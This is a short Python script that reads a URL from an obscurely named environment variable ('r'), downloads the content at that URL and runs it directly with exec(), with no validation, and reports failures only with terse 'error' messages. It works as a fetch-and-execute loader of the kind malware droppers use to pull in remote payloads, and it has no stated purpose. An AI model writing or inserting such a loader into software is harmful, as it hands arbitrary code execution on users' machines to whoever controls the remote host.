import os
import requests

url = os.getenv("r")

if not url:
    print("error")
    exit()

try:
    response = requests.get(url)

    if response.status_code == 200:
        exec(response.text)
    else:
        print("error", response.status_code)

except Exception as error:
    print("error", error)
